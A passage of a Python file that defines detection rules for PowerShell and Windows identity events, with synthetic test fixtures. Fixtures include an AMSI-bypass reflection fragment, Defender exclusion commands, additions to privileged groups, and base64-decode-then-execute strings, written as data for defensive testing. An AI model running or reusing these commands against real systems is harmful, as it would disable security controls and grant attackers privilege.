        test_strategy=(
            "Positive cases include assembly loading and dynamic delegate creation. Negative "
            "cases use ordinary type usage, module import, and a comment that mentions "
            "reflection."
        ),
        volume="Low; concentrated on engineering workstations.",
        related=["SDEL-PS-005", "SDEL-PS-009"],
        pos=[
            case(
                "assembly_load_from_bytes",
                "Script block loading an assembly from a synthetic placeholder byte array.",
                "The reflection terminology selection matches.",
                ScriptBlockText=(
                    f"$bytes = [Convert]::FromBase64String('{ENC_PLACEHOLDER}'); "
                    "[Reflection.Assembly]::Load($bytes)"
                ),
            ),
            case(
                "dynamic_delegate_creation",
                "Script block creating a delegate from a function pointer.",
                "The reflection terminology selection matches.",
                ScriptBlockText=(
                    "$delegate = [Runtime.InteropServices.Marshal]::"
                    "GetDelegateForFunctionPointer($ptr, $type)"
                ),
            ),
        ],
        neg=[
            case(
                "ordinary_type_usage",
                "Script block using a framework type without reflection.",
                "No reflection terminology is present.",
                ScriptBlockText="$builder = New-Object System.Text.StringBuilder",
            ),
            case(
                "module_import",
                "Script block importing an approved module.",
                "No reflection terminology is present.",
                ScriptBlockText="Import-Module -Name SyntheticInventory -ErrorAction Stop",
            ),
            case(
                "comment_mentions_reflection",
                "Script block whose comment mentions reflection in prose.",
                "The prose does not contain any of the matched construct strings.",
                ScriptBlockText="# This module avoids reflection on purpose\nGet-Process | Select-Object -First 1",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-005",
        family="powershell",
        path="powershell",
        file="powershell_scanning_interface_bypass_terminology.yml",
        title="PowerShell Script Block Referencing Scanning Interface Internals",
        level="high",
        profile="win_ps_script",
        desc=(
            "Detects script block text that references internal type and field names belonging "
            "to the script scanning interface. The rule matches indicator strings only and "
            "deliberately contains no functional bypass technique."
        ),
        hypothesis=(
            "If script scanning is targeted for interference, the logged script block will "
            "reference the internal type and field names of the scanning interface."
        ),
        techniques=["T1685"],
        extra_techniques=["T1059.001"],
        refs=[attack_url("T1685"), attack_url("T1059.001"), MS_PS_LOGGING],
        detection=[
            (
                "selection_scanner_internals",
                [
                    (
                        "ScriptBlockText|contains",
                        [
                            "AmsiUtils",
                            "amsiInitFailed",
                            "amsiContext",
                            "EnableScriptBlockLogging",
                        ],
                    )
                ],
            ),
            (
                "selection_modification_verbs",
                [
                    (
                        "ScriptBlockText|contains",
                        ["SetValue", "GetField", "NonPublic", "::Static"],
                    )
                ],
            ),
        ],
        condition="selection_scanner_internals and selection_modification_verbs",
        fps=[
            "Security research and detection engineering laboratories that intentionally author "
            "scanner interaction test scripts on isolated hosts.",
            "Endpoint tooling validation scripts that read scanning interface state to confirm "
            "the control is enabled before a compliance report.",
        ],
        fp_strategy=(
            "Benign matches are confined to named research or validation hosts and to a small "
            "set of authors. Tune on the host name and script path, and treat any match outside "
            "those hosts as an incident."
        ),
        tuning=(
            "Restrict exclusions to the research host names. Do not exclude the interface type "
            "names, because they carry the whole signal."
        ),
        test_strategy=(
            "Positive cases pair the interface type names with reflective field modification "
            "verbs. Negative cases include the type name alone and the verbs alone."
        ),
        volume="Very low; effectively zero outside research hosts.",
        related=["SDEL-PS-004", "SDEL-WIN-011"],
        pos=[
            case(
                "field_lookup_and_set",
                "Script block locating a non-public field on the scanner type.",
                "Both the interface and modification selections match.",
                ScriptBlockText=(
                    "$type = [Ref].Assembly.GetType('SyntheticNamespace.AmsiUtils'); "
                    "$field = $type.GetField('amsiInitFailed','NonPublic,Static')"
                ),
            ),
            case(
                "context_field_write",
                "Script block writing to a scanner context field.",
                "Both the interface and modification selections match.",
                ScriptBlockText=(
                    "$field = $type.GetField('amsiContext','NonPublic,Static'); "
                    f"$field.SetValue($null, '{ENC_PLACEHOLDER}')"
                ),
            ),
        ],
        neg=[
            case(
                "compliance_state_read",
                "Compliance script reading the logging policy value.",
                "Only the interface selection matches, so the condition fails.",
                ScriptBlockText=(
                    "Get-ItemProperty -Path "
                    "'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\"
                    "ScriptBlockLogging' -Name EnableScriptBlockLogging"
                ),
            ),
            case(
                "generic_reflection_helper",
                "Utility script using reflection on an unrelated type.",
                "Only the modification selection matches, so the condition fails.",
                ScriptBlockText=(
                    "$field = [SyntheticNamespace.Config].GetField('cacheSize','NonPublic,Static')"
                ),
            ),
            case(
                "inventory_report",
                "Ordinary inventory script.",
                "Neither selection matches.",
                ScriptBlockText="Get-CimInstance -ClassName Win32_OperatingSystem | Out-String",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-006",
        family="powershell",
        path="powershell",
        file="powershell_security_product_exclusion_modification.yml",
        title="PowerShell Command Adding An Endpoint Protection Exclusion",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects the endpoint protection preference cmdlets being used to add a scanning "
            "exclusion. Adding an exclusion creates a blind spot that persists long after the "
            "command itself has finished."
        ),
        hypothesis=(
            "If an adversary prepares a directory that will not be scanned, the command line "
            "will contain a preference cmdlet together with an exclusion parameter."
        ),
        techniques=["T1685"],
        refs=[attack_url("T1685"), MS_MPPREF],
        detection=[
            (
                "selection_preference_cmdlet",
                [("CommandLine|contains", ["Add-MpPreference", "Set-MpPreference"])],
            ),
            (
                "selection_exclusion_parameter",
                [
                    (
                        "CommandLine|contains",
                        ["-ExclusionPath", "-ExclusionProcess", "-ExclusionExtension"],
                    )
                ],
            ),
        ],
        condition="selection_preference_cmdlet and selection_exclusion_parameter",
        fps=[
            "Database and virtualisation platform installers that add vendor-recommended "
            "exclusions for data directories during initial server setup.",
            "Build agent provisioning that excludes the compiler output directory to keep "
            "continuous integration times predictable.",
        ],
        fp_strategy=(
            "Benign matches occur on server and build roles during provisioning and reference "
            "documented vendor paths. Tune on the host role and the exact excluded path."
        ),
        tuning=(
            "Exclude the documented vendor data directory on the server role that needs it. "
            "Never allow exclusions for user-writable directories such as the temporary or "
            "public profile directories."
        ),
        test_strategy=(
            "Positive cases add a path exclusion and a process exclusion. Negative cases remove "
            "an exclusion, list current preferences, and use an unrelated cmdlet."
        ),
        volume="Low; every match should map to a change record.",
        related=["SDEL-WIN-011"],
        pos=[
            case(
                "add_path_exclusion",
                "Path exclusion added for a user-writable directory.",
                "Cmdlet and exclusion parameter selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Add-MpPreference -ExclusionPath '"
                    + P_TEMP_USER
                    + "'"
                ),
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
            case(
                "add_process_exclusion",
                "Process exclusion added for a synthetic binary.",
                "Cmdlet and exclusion parameter selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Add-MpPreference -ExclusionProcess "
                    "'synthetic_tool.exe'"
                ),
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
        ],
        neg=[
            case(
                "remove_exclusion",
                "Existing exclusion removed during cleanup.",
                "The preference cmdlet selection does not match the removal cmdlet.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Remove-MpPreference -ExclusionPath '"
                    + P_TEMP_USER
                    + "'"
                ),
            ),
            case(
                "list_preferences",
                "Current preferences listed for a compliance report.",
                "The exclusion parameter selection does not match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Get-MpPreference | Out-String",
            ),
            case(
                "unrelated_cmdlet",
                "Scheduled inventory collection.",
                "Neither selection matches.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Get-CimInstance Win32_LogicalDisk",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-007",
        family="powershell",
        path="powershell",
        file="powershell_privileged_group_membership_modification.yml",
        title="PowerShell Command Modifying Privileged Group Membership",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects command lines that add a member to a privileged local or directory group. "
            "The rule complements the directory audit rules by capturing the client-side "
            "invocation, including cases where directory auditing is incomplete."
        ),
        hypothesis=(
            "If privileges are granted through group membership, the invoking command line will "
            "name both a membership cmdlet and a privileged group."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), MS_LOCALGROUP],
        detection=[
            (
                "selection_membership_command",
                [
                    (
                        "CommandLine|contains",
                        ["Add-LocalGroupMember", "Add-ADGroupMember", "net localgroup", "net group"],
                    )
                ],
            ),
            ("selection_privileged_group", [("CommandLine|contains", list(PRIV_GROUPS))]),
        ],
        condition="selection_membership_command and selection_privileged_group",
        fps=[
            "Identity governance automation that grants time-bound administrative access as part "
            "of an approved privileged access management workflow.",
            "Server build scripts that add the platform operations group to the local "
            "administrators group during provisioning.",
        ],
        fp_strategy=(
            "Benign matches run under identity automation accounts, reference a governance group "
            "rather than an individual, and correlate with an approval record. Tune on the "
            "invoking account and the added principal."
        ),
        tuning=(
            "Exclude the privileged access management service account only. Do not exclude the "
            "group names, and keep coverage for the local administrators group on endpoints."
        ),
        test_strategy=(
            "Positive cases use the directory cmdlet and the legacy net command. Negative cases "
            "modify a non-privileged group, query membership, and remove a member."
        ),
        volume="Low; a few matches per week in a governed environment.",
        related=["SDEL-ID-003", "SDEL-COR-004"],
        pos=[
            case(
                "ad_group_member_added",
                "Directory cmdlet adds a member to a privileged directory group.",
                "Membership command and privileged group selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Add-ADGroupMember -Identity 'Domain Admins' "
                    f"-Members {USER_STD}"
                ),
                User=f"SYNTHETIC\\{USER_ADM}",
            ),
            case(
                "local_administrators_added",
                "Legacy command adds a member to the local administrators group.",
                "Membership command and privileged group selections both match.",
                Image=P_SYS32 + "cmd.exe",
                CommandLine=f"cmd.exe /c net localgroup Administrators {USER_STD} /add",
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
        ],
        neg=[
            case(
                "non_privileged_group_added",
                "Member added to an ordinary application group.",
                "The privileged group selection does not match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Add-ADGroupMember -Identity 'Synthetic App Users' "
                    f"-Members {USER_STD}"
                ),
            ),
            case(
                "group_membership_query",
                "Privileged group membership listed for an access review.",
                "The membership command selection does not match a query cmdlet.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Get-ADGroupMember -Identity 'Domain Admins'",
            ),
            case(
                "member_removed",
                "Member removed from a privileged group.",
                "The membership command selection matches only addition verbs.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -Command Remove-ADGroupMember -Identity 'Domain Admins' "
                    f"-Members {USER_STD}"
                ),
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-008",
        family="powershell",
        path="powershell",
        file="powershell_scheduled_task_creation.yml",
        title="Scheduled Task Created Through PowerShell",
        level="low",
        profile="win_ps_script",
        desc=(
            "Detects script block content that registers a scheduled task. Task creation through "
            "PowerShell is common in automation, so the rule is rated low and is intended for "
            "context enrichment and hunting."
        ),
        hypothesis=(
            "If persistence is created programmatically, the logged script block will contain a "
            "scheduled task registration cmdlet together with an action definition."
        ),
        techniques=["T1053.005"],
        refs=[attack_url("T1053.005"), MS_SCHTASK_PS],
        detection=[
            (
                "selection_task_cmdlet",
                [
                    (
                        "ScriptBlockText|contains",
                        ["Register-ScheduledTask", "New-ScheduledTask", "Set-ScheduledTask"],
                    )
                ],
            ),
            (
                "selection_task_action",
                [("ScriptBlockText|contains", ["New-ScheduledTaskAction", "-Action "])],
            ),
        ],
        condition="selection_task_cmdlet and selection_task_action",
        fps=[
            "Configuration management modules that register maintenance tasks such as log "
            "rotation on every managed server.",
            "Application installers written in PowerShell that create their own update check "
            "task during setup.",
        ],
        fp_strategy=(
            "Benign matches dominate this rule, which is why it is low severity. Tune by "
            "enriching with the task action path and by hunting on tasks whose action points at "
            "a user-writable directory."
        ),
        tuning=(
            "Combine with the temporary path scheduled task rule instead of excluding "
            "configuration management modules, so that unusual task actions remain visible."
        ),
        test_strategy=(
            "Positive cases register a task with an action object and with an inline action "
            "parameter. Negative cases query tasks, unregister a task, and mention the cmdlet "
            "name in a comment."
        ),
        volume="Moderate in automated environments.",
        related=["SDEL-WIN-007"],
        pos=[
            case(
                "register_with_action_object",
                "Script block registering a task built from an action object.",
                "Both cmdlet and action selections match.",
                ScriptBlockText=(
                    "$action = New-ScheduledTaskAction -Execute '"
                    + P_TEMP_USER
                    + "synthetic_task.exe'; "
                    "Register-ScheduledTask -TaskName 'SyntheticTask' -Action $action"
                ),
            ),
            case(
                "register_with_inline_action",
                "Script block registering a task with an inline action parameter.",
                "Both cmdlet and action selections match.",
                ScriptBlockText=(
                    "Register-ScheduledTask -TaskName 'SyntheticMaintenance' -Action "
                    "$maintenanceAction -Trigger $dailyTrigger"
                ),
            ),
        ],
        neg=[
            case(
                "list_scheduled_tasks",
                "Script block listing existing scheduled tasks.",
                "Neither selection matches.",
                ScriptBlockText="Get-ScheduledTask | Select-Object TaskName, State",
            ),
            case(
                "unregister_task",
                "Script block removing a scheduled task.",
                "The registration cmdlet selection does not match a removal cmdlet.",
                ScriptBlockText="Unregister-ScheduledTask -TaskName 'SyntheticTask' -Confirm:$false",
            ),
            case(
                "comment_mentions_cmdlet",
                "Script block whose comment names the registration cmdlet.",
                "The action selection does not match, so the condition fails.",
                ScriptBlockText="# Register-ScheduledTask is intentionally not used here\nGet-Date",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-009",
        family="powershell",
        path="powershell",
        file="powershell_base64_decode_with_dynamic_execution.yml",
        title="PowerShell Script Block Combining Base64 Decoding With Dynamic Execution",
        level="high",
        profile="win_ps_script",
        desc=(
            "Detects script block content that decodes a base64 string and then evaluates the "
            "result dynamically. The fixtures use a synthetic placeholder string and contain no "
            "decodable payload."
        ),
        hypothesis=(
            "If an obfuscated stage is executed in memory, the logged script block will contain "
            "both a base64 decoding call and a dynamic evaluation construct."
        ),
        techniques=["T1027"],
        extra_techniques=["T1059.001", "T1140"],
        refs=[attack_url("T1027"), attack_url("T1140"), attack_url("T1059.001"), MS_PS_LOGGING],
        detection=[
            (
                "selection_base64_decode",
                [
                    (
                        "ScriptBlockText|contains",
                        ["FromBase64String", "Convert]::FromBase64", "System.Convert::FromBase64"],
                    )
                ],
            ),
            (
                "selection_dynamic_execution",
                [
                    (
                        "ScriptBlockText|contains",
                        ["Invoke-Expression", "IEX ", "IEX(", ".Invoke()", "ScriptBlock]::Create"],
                    )
                ],
            ),
        ],
        condition="selection_base64_decode and selection_dynamic_execution",
        fps=[
            "Internal deployment modules that store a configuration template as base64 and "
            "expand it into a script block during installation.",
            "Legacy automation that transports quoted SQL statements as base64 to avoid escaping "
            "problems and then evaluates the decoded text.",
        ],
        fp_strategy=(
            "Benign matches come from a small number of internal modules with stable script "
            "paths and predictable schedules. Tune on the Path field and require review before "
            "adding any exclusion."
        ),
        tuning=(
            "Exclude the specific internal module path. Never exclude the decoding call alone, "
            "because it is the most reusable part of the pattern."
        ),
        test_strategy=(
            "Positive cases pair decoding with expression invocation and with script block "
            "creation. Negative cases use decoding for a file write and evaluation of a literal "
            "string."
        ),
        volume="Low; each match usually merits inspection of the decoded content.",
        related=["SDEL-PS-001", "SDEL-PS-004"],
        pos=[
            case(
                "decode_then_invoke_expression",
                "Script block decoding a placeholder and evaluating it.",
                "Decoding and dynamic execution selections both match.",
                ScriptBlockText=(
                    f"$text = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{ENC_PLACEHOLDER}')); "
                    "Invoke-Expression $text"
                ),
            ),
            case(
                "decode_then_create_scriptblock",
                "Script block decoding a placeholder and creating a script block from it.",
                "Decoding and dynamic execution selections both match.",
                ScriptBlockText=(
                    f"$raw = [Convert]::FromBase64String('{ENC_PLACEHOLDER}'); "
                    "$sb = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($raw))"
                ),
            ),
        ],
        neg=[
            case(
                "decode_to_file",
                "Script block decoding a placeholder into a file without evaluating it.",
                "The dynamic execution selection does not match.",
                ScriptBlockText=(
                    f"$bytes = [Convert]::FromBase64String('{ENC_PLACEHOLDER}'); "
                    f"[IO.File]::WriteAllBytes('{P_TEMP_USER}synthetic_output.bin', $bytes)"
                ),
            ),
            case(
                "invoke_literal_command",
                "Script block evaluating a literal command string.",
                "The decoding selection does not match.",
                ScriptBlockText="Invoke-Expression 'Get-Date'",
            ),
            case(
                "base64_encoding_only",
                "Script block encoding text for transport.",
                "Neither selection matches, because encoding is not decoding.",
                ScriptBlockText=(
                    "$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('synthetic'))"
                ),
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-010",
        family="powershell",
        path="powershell",
        file="powershell_launched_by_office_like_application.yml",
        title="PowerShell Launched By An Office-Like Application",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects PowerShell whose parent process is a synthetic office application. This is "
            "the PowerShell-specific companion to the broader interpreter rule and is kept "
            "separate so that its tuning and response guidance can differ."
        ),
        hypothesis=(
            "If document content launches PowerShell, the process creation event will show an "
            "office application as the parent image of the PowerShell process."
        ),
        techniques=["T1059.001"],
        extra_techniques=["T1204.002"],
        refs=[attack_url("T1059.001"), attack_url("T1204.002"), MS_PS_LOGGING],
        detection=[
            ("selection_office_parent", [("ParentImage|endswith", list(OFFICE_PARENTS))]),
            ("selection_powershell_child", [("Image|endswith", ["\\powershell.exe", "\\pwsh.exe"])]),
        ],
        condition="selection_office_parent and selection_powershell_child",
        fps=[
            "Reporting workbooks in finance that refresh data through a signed PowerShell helper "
            "invoked from a document macro.",
            "Mail client add-ins that call PowerShell once during add-in registration after an "
            "office suite upgrade.",
        ],
        fp_strategy=(
            "Benign matches involve a small number of workbooks and always use the same helper "
            "script path. Tune on the child command line and require the script to be signed."
        ),
        tuning=(
            "Exclude the signed helper script path, not the office parent image, so that "
            "unexpected PowerShell from documents remains visible."
        ),
        test_strategy=(
            "Positive cases use two different office parents. Negative cases keep the parent "
            "benign, keep the child benign, and use a scripting host instead of PowerShell."
        ),
        volume="Very low in most environments.",
        related=["SDEL-WIN-002"],
        pos=[
            case(
                "spreadsheet_parent",
                "Synthetic spreadsheet application launches PowerShell.",
                "Parent and child selections both match.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_excel.exe",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=f"powershell.exe -nop -w hidden -enc {ENC_PLACEHOLDER}",
            ),
            case(
                "mail_client_parent",
                "Synthetic mail client launches PowerShell.",
                "Parent and child selections both match.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_outlook.exe",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -NoProfile -Command Write-Output 'synthetic'",
            ),
        ],
        neg=[
            case(
                "office_parent_spawns_helper",
                "Office application launches its own signed helper.",
                "Parent matches but the child is not PowerShell.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_excel.exe",
                Image=P_PROG + "SyntheticOffice\\synthetic_refresh_helper.exe",
                CommandLine="synthetic_refresh_helper.exe /refresh",
            ),
            case(
                "scheduler_parent_spawns_powershell",
                "Task scheduler launches PowerShell for a maintenance job.",
                "Child matches but the parent is not an office application.",
                ParentImage=P_SYS32 + "svchost.exe",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -File " + P_PROG + "SyntheticAgent\\maintenance.ps1",
            ),
            case(
                "office_parent_spawns_script_host",
                "Office application launches the legacy script host.",
                "Parent matches but the child is a script host, covered by another rule.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_word.exe",
                Image=P_SYS32 + "wscript.exe",
                CommandLine="wscript.exe " + P_TEMP_USER + "synthetic_macro.vbs",
            ),
        ],
    )
)

# ---------------------------------------------------------------- IDENTITY (12)

RULES.append(
    rule(
        cid="SDEL-ID-001",
        family="identity",
        path="identity/windows_security",
        file="user_account_created.yml",
        title="User Account Created",
        level="low",
        profile="win_security",
        desc=(
            "Detects account creation recorded in the Security log. Account creation is a normal "
            "administrative action, so this rule provides baseline visibility and correlation "
            "input rather than a standalone alert."
        ),
        hypothesis=(
            "If an adversary establishes a new foothold identity, the account creation audit "
            "record will name the creating subject and the new account."
        ),
        techniques=["T1136.001"],
        refs=[attack_url("T1136.001"), ms_event(4720)],
        detection=[
            ("selection_account_created", [("EventID", 4720)]),
            ("filter_provisioning_service", [("SubjectUserName", "synthetic-service-provisioning")]),
        ],
        condition="selection_account_created and not filter_provisioning_service",
        fps=[
            "Joiner automation from the human resources system creating accounts in batches "
            "every morning, which the provisioning service filter removes.",
            "Service account creation performed by platform engineers during an application "
            "onboarding project.",
            "Test account creation in a pre-production directory that shares the same audit "
            "pipeline.",
        ],
        fp_strategy=(
            "Nearly all matches are legitimate provisioning. Value comes from correlating the "
            "new account with subsequent privileged group changes and first logon location."
        ),
        tuning=(
            "Keep the rule at low severity and route it to enrichment rather than to a queue. "
            "Exclude only the named provisioning service account."
        ),
        test_strategy=(
            "Positive cases create accounts from two different administrative subjects. Negative "
            "cases use the provisioning service, an account deletion, and a password change."
        ),
        volume="Low to moderate depending on joiner volume.",
        related=["SDEL-ID-002", "SDEL-ID-003"],
        pos=[
            case(
                "created_by_admin",
                "Account created by a synthetic administrator.",
                "Creation event matches and no filter applies.",
                EventID=4720,
                SubjectUserName=USER_ADM,
                TargetUserName="synthetic-newuser",
            ),
            case(
                "created_by_helpdesk",
                "Account created by a synthetic help desk operator.",
                "Creation event matches and no filter applies.",
                EventID=4720,
                SubjectUserName="synthetic-helpdesk",
                TargetUserName="synthetic-contractor",
            ),
        ],
        neg=[
            case(
                "created_by_provisioning_service",
                "Account created by the joiner provisioning service.",
                "Creation event matches but the provisioning filter removes it.",
                EventID=4720,
                SubjectUserName="synthetic-service-provisioning",
                TargetUserName="synthetic-newhire",
            ),
            case(
                "account_deleted",
                "Account deleted during a leaver process.",
                "The event identifier is a deletion, not a creation.",
                EventID=4726,
                SubjectUserName=USER_ADM,
                TargetUserName="synthetic-leaver",
            ),
            case(
                "password_changed",
                "User changed their own password.",
                "The event identifier does not match.",
                EventID=4723,
                SubjectUserName=USER_STD,
                TargetUserName=USER_STD,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-002",
        family="identity",
        path="identity/windows_security",
        file="user_account_enabled.yml",
        title="Disabled User Account Enabled",
        level="informational",
        profile="win_security",
        desc=(
            "Detects a previously disabled account being enabled. Re-enabling a dormant account "
            "is a quiet way to obtain a credentialed identity, but it is also routine during "
            "re-hire and leave-return processes, so the rule is informational."
        ),
        hypothesis=(
            "If a dormant identity is revived for access, the directory will record an account "
            "enabled audit event naming the enabling subject."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(4722)],
        detection=[
            ("selection_account_enabled", [("EventID", 4722)]),
        ],
        condition="selection_account_enabled",
        fps=[
            "Return-from-leave processing that re-enables accounts on the employee return date.",
            "Re-hire workflows that reuse the previous identity instead of creating a new one.",
            "Service account maintenance where an account is disabled for a change window and "
            "then re-enabled.",
        ],
        fp_strategy=(
            "Most matches are legitimate lifecycle events. The signal comes from enabling "
            "accounts that have been dormant for a long period or that hold privileged group "
            "membership."
        ),
        tuning=(
            "Enrich with the account last logon timestamp and privileged group membership rather "
            "than excluding subjects. Keep the rule informational and use it for correlation."
        ),
        test_strategy=(
            "Positive cases enable a dormant standard account and a dormant service account. "
            "Negative cases disable an account, unlock an account, and create an account."
        ),
        volume="Low.",
        related=["SDEL-ID-001", "SDEL-ID-005"],
        pos=[
            case(
                "dormant_user_enabled",
                "Dormant standard account enabled by an administrator.",
                "The account enabled selection matches.",
                EventID=4722,
                SubjectUserName=USER_ADM,
                TargetUserName="synthetic-dormant",
            ),
            case(
                "service_account_enabled",
                "Service account enabled after a change window.",
                "The account enabled selection matches.",
                EventID=4722,
                SubjectUserName=USER_ADM,
                TargetUserName=USER_SVC,
            ),
        ],
        neg=[
            case(
                "account_disabled",
                "Account disabled during a leaver process.",
                "The event identifier is a disable, not an enable.",
                EventID=4725,
                SubjectUserName=USER_ADM,
                TargetUserName="synthetic-leaver",
            ),
            case(
                "account_unlocked",
                "Locked account unlocked by the help desk.",
                "The event identifier does not match.",
                EventID=4767,
                SubjectUserName="synthetic-helpdesk",
                TargetUserName=USER_STD,
            ),
            case(
                "account_created",
                "New account created.",
                "The event identifier does not match.",
                EventID=4720,
                SubjectUserName=USER_ADM,
                TargetUserName="synthetic-newuser",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-003",
        family="identity",
        path="identity/active_directory",
        file="privileged_group_member_added.yml",
        title="Member Added To A Privileged Directory Or Local Group",
        level="high",
        profile="win_security",
        desc=(
            "Detects membership additions to privileged security groups. Privileged group "
            "membership is the most direct route to durable administrative control, so each "
            "addition needs an approval record."
        ),
        hypothesis=(
            "If privileges are escalated through group membership, the directory audit log will "
            "record a member addition naming a privileged group."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(4728), ms_event(4732)],
        detection=[
            ("selection_member_added", [("EventID", [4728, 4732, 4756])]),
            ("selection_privileged_group", [("TargetUserName", list(PRIV_GROUPS))]),
        ],
        condition="selection_member_added and selection_privileged_group",
        fps=[
            "Privileged access management platforms granting just-in-time membership for an "
            "approved change window and removing it afterwards.",
            "Domain controller promotion and demotion workflows that adjust built-in group "
            "membership as part of the process.",
        ],
        fp_strategy=(
            "Benign matches pair with an approval ticket and are reversed within hours. Tune by "
            "correlating with the removal event and with the access management service account."
        ),
        tuning=(
            "Exclude the privileged access management service account only when the paired "
            "removal event is also observed. Never exclude the group names."
        ),
        test_strategy=(
            "Positive cases add members to a domain group and to the local administrators group. "
            "Negative cases add to a non-privileged group, remove a member, and create a group."
        ),
        volume="Low; each match should be reviewed.",
        related=["SDEL-ID-004", "SDEL-PS-007", "SDEL-COR-004"],
        pos=[
            case(
                "domain_admins_addition",
                "Member added to a privileged domain group.",
                "Both the event identifier and the group selections match.",
                EventID=4728,
                TargetUserName="Domain Admins",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                SubjectUserName=USER_ADM,
            ),
            case(
                "local_administrators_addition",
                "Member added to the local administrators group.",
                "Both the event identifier and the group selections match.",
                EventID=4732,
                TargetUserName="Administrators",
                MemberName=f"{HOST_WIN}\\{USER_STD}",
                SubjectUserName=USER_ADM,
                Computer=HOST_WIN,
            ),
        ],
        neg=[
            case(
                "application_group_addition",
                "Member added to an application access group.",
                "The privileged group selection does not match.",
                EventID=4728,
                TargetUserName="Synthetic App Users",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
            ),
            case(
                "privileged_group_removal",
                "Member removed from a privileged group.",
                "The event identifier selection covers additions only.",
                EventID=4729,
                TargetUserName="Domain Admins",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
            ),
            case(
                "security_group_created",
                "New security group created.",
                "The event identifier selection does not match.",
                EventID=4727,
                TargetUserName="Synthetic Project Group",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-004",
        family="identity",
        path="identity/active_directory",
        file="privileged_group_member_removed_unexpectedly.yml",
        title="Member Removed From A Privileged Group Outside Governance Automation",
        level="medium",
        profile="win_security",
        desc=(
            "Detects removal of a member from a privileged group by a subject other than the "
            "identity governance service. Unexpected removals can indicate an attempt to hide "
            "prior activity or to disrupt administrative response."
        ),
        hypothesis=(
            "If group membership is manipulated to cover tracks or to remove defenders, the "
            "removal event will be raised by an interactive administrator rather than by the "
            "governance automation account."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(4729)],
        detection=[
            ("selection_member_removed", [("EventID", [4729, 4733, 4757])]),
            ("selection_privileged_group", [("TargetUserName", list(PRIV_GROUPS))]),
            ("filter_governance_service", [("SubjectUserName", "synthetic-service-iam")]),
        ],
        condition=(
            "selection_member_removed and selection_privileged_group "
            "and not filter_governance_service"
        ),
        fps=[
            "Identity governance automation expiring a time-bound grant, which the service "
            "account filter removes.",
            "Quarterly access recertification campaigns where reviewers remove stale members in "
            "bulk over a short period.",
        ],
        fp_strategy=(
            "Benign removals cluster around recertification campaigns and are performed by "
            "reviewers. Tune by correlating with the campaign window rather than by excluding "
            "individual administrators."
        ),
        tuning=(
            "Keep the governance service filter narrow and named. Avoid excluding human "
            "administrator accounts, since those are the accounts most likely to be abused."
        ),
        test_strategy=(
            "Positive cases remove members from a domain group and from the local administrators "
            "group. Negative cases cover the governance service, a non-privileged group, and an "
            "addition event."
        ),
        volume="Low.",
        related=["SDEL-ID-003"],
        pos=[
            case(
                "domain_group_removal_by_admin",
                "Administrator removes a member from a privileged domain group.",
                "Removal and privileged group selections match, and the filter does not apply.",
                EventID=4729,
                TargetUserName="Domain Admins",
                MemberName=f"CN={USER_ADM},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                SubjectUserName="synthetic-operator",
            ),
            case(
                "local_group_removal_by_admin",
                "Administrator removes a member from the local administrators group.",
                "Removal and privileged group selections match, and the filter does not apply.",
                EventID=4733,
                TargetUserName="Administrators",
                MemberName=f"{HOST_WIN}\\{USER_ADM}",
                SubjectUserName="synthetic-operator",
                Computer=HOST_WIN,
            ),
        ],
        neg=[
            case(
                "governance_service_removal",
                "Governance automation expires a time-bound grant.",
                "Selections match but the governance service filter removes the event.",
                EventID=4729,
